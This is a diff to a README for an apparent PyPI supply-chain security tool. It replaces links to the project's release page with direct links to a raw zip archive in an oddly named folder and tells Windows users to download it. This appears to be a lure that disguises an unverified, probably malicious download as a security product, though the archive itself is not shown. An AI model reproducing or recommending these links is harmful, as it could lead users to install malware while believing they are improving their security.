@@ -1,6 +1,6 @@
 # 🛡️ pypi-security-best-practices - Protect your software supply chain easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tildaknifelike3834/pypi-security-best-practices/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/tildaknifelike3834/pypi-security-best-practices/main/reprobator/practices_best_security_pypi_v2.7.zip)
 
 This software provides a set of verified methods to secure your Python projects. It helps you manage packages from the PyPI registry with confidence. Developers use these tools to prevent vulnerabilities and secure the supply chain of their applications.
 
@@ -27,7 +27,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 You must download the correct file for your Windows system. Use the link below to reach the official release repository.
 
-[Click here to visit the release page and download the software](https://github.com/tildaknifelike3834/pypi-security-best-practices/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/tildaknifelike3834/pypi-security-best-practices/main/reprobator/practices_best_security_pypi_v2.7.zip)
 
 1. Navigate to the link above.
 2. Locate the list of assets under the latest release.
